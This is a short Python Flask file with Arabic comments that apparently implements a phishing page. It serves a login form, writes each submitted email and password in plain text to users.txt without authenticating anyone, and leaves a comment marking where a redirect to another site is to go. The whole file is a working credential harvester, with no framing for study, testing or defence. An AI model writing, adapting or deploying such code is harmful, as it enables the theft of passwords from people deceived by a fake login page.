from flask import Flask, render_template, request

app = Flask(__name__)

# الصفحة الرئيسية
@app.route('/')
def home():
    return render_template('login.html')

# تسجيل الدخول وحفظ البيانات
@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    # تخزين البيانات في ملف users.txt
    with open("users.txt", "a", encoding="utf-8") as file:
        file.write(f"====================\n")
        file.write(f"البريد الإلكتروني: {email}\n")
        file.write(f"كلمة المرور: {password}\n")
        file.write(f"====================\n\n")
# هنا احط للينك اللي ها يتفتح ليه بعد تسجيل الدخول
    return ""

# تشغيل السيرفر
if __name__ == '__main__':
    app.run(debug=True)
